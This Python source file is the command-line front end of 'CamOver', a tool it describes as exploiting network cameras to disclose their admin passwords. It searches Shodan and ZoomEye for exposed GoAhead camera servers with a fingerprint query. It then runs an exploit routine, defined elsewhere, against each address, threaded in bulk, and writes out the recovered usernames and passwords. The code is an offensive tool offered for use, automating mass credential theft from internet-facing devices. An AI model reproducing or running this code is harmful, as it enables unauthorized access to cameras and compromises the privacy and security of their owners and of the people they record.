#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import argparse
import threading
import requests

from shodan import Shodan
from time import sleep as thread_delay

from .__main__ import CamOver
from .badges import Badges


class CamOverCLI(CamOver, Badges):
    thread_delay = 0.1

    description = "CamOver is a camera exploitation tool that allows to disclosure network camera admin password."
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-t', '--threads', dest='threads', action='store_true', help='Use threads for fastest work.')
    parser.add_argument('-o', '--output', dest='output', help='Output result to file.')
    parser.add_argument('-i', '--input', dest='input', help='Input file of addresses.')
    parser.add_argument('-a', '--address', dest='address', help='Single address.')
    parser.add_argument('--shodan', dest='shodan', help='Shodan API key for exploiting devices over Internet.')
    parser.add_argument('--zoomeye', dest='zoomeye', help='ZoomEye API key for exploiting devices over Internet.')
    parser.add_argument('-p', '--pages', dest='pages', type=int, help='Number of pages you want to get from ZoomEye.')
    args = parser.parse_args()

    def thread(self, address):
        result = self.exploit(address)

        if result:
            result = f"({address}) - {result[0]}:{result[1]}"
            if not self.args.output:
                self.print_success(result)
            else:
                with open(self.args.output, 'a') as f:
                    f.write(f"{result}\n")

    def crack(self, addresses):
        line = "/-\|"

        counter = 0
        threads = list()
        for address in addresses:
            if counter >= len(line):
                counter = 0
            self.print_process(f"Exploiting... ({address}) {line[counter]}", end='')

            if not self.args.threads:
                self.thread(address)
            else:
                thread_delay(self.thread_delay)
                thread = threading.Thread(target=self.thread, args=[address])

                thread.start()
                threads.append(thread)
            counter += 1
            
        counter = 0
        for thread in threads:
            if counter >= len(line):
                counter = 0
            self.print_process(f"Cleaning up... {line[counter]}", end='')

            if thread.is_alive():
                thread.join()
            counter += 1
        
    def start(self):
        if self.args.output:
            directory = os.path.split(self.args.output)[0]
            if not os.path.isdir(directory):
                self.print_error(f"Directory: {directory}: does not exist!")
                return

        if self.args.zoomeye:
            self.print_process("Authorizing ZoomEye by given API key...")
            try:
                zoomeye = 'https://api.zoomeye.org/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41&page='
                zoomeye_header = {
                    'Authorization': f'JWT {self.zoomeye}'
                }
                addresses = list()

                if self.args.pages:
                    pages = int(self.args.pages)
                else:
                    pages = 100
                pages, page = divmod(pages, 20)
                if page != 0:
                    pages += 1

                for page in range(1, pages + 1):
                    results = requests.get(zoomeye + str(page), headers=zoomeye_header).json()
                    if not len(results['matches']):
                        self.print_error("Failed to authorize ZoomEye!")
                        return
                    for address in results['matches']:
                        addresses.append(address['ip'] + ':' + str(address['portinfo']['port']))
            except Exception:
                self.print_error("Failed to authorize ZoomEye!")
                return
            self.crack(addresses)

        elif self.args.shodan:
            self.print_process("Authorizing Shodan by given API key...")
            try:
                shodan = Shodan(self.args.shodan)
                results = shodan.search(query='GoAhead 5ccc069c403ebaf9f0171e9517f40e41')
                addresses = list()
                for result in results['matches']:
                    addresses.append(result['ip_str'] + ':' + str(result['port']))
            except Exception:
                self.print_error("Failed to authorize Shodan!")
                return
            self.print_success("Authorization successfully completed!")
            self.crack(addresses)

        elif self.args.input:
            if not os.path.exists(self.args.input):
                self.print_error(f"Input file: {self.args.input}: does not exist!")
                return

            with open(self.args.input, 'r') as f:
                addresses = f.read().strip().split('\n')
                self.crack(addresses)

        elif self.args.address:
            self.print_process(f"Exploiting {self.args.address}...")
            self.thread(self.args.address)

        else:
            self.parser.print_help()
            return
        self.print_empty(end='')

def main():
    try:
        cli = CamOverCLI()
        cli.start()
    except Exception:
        pass
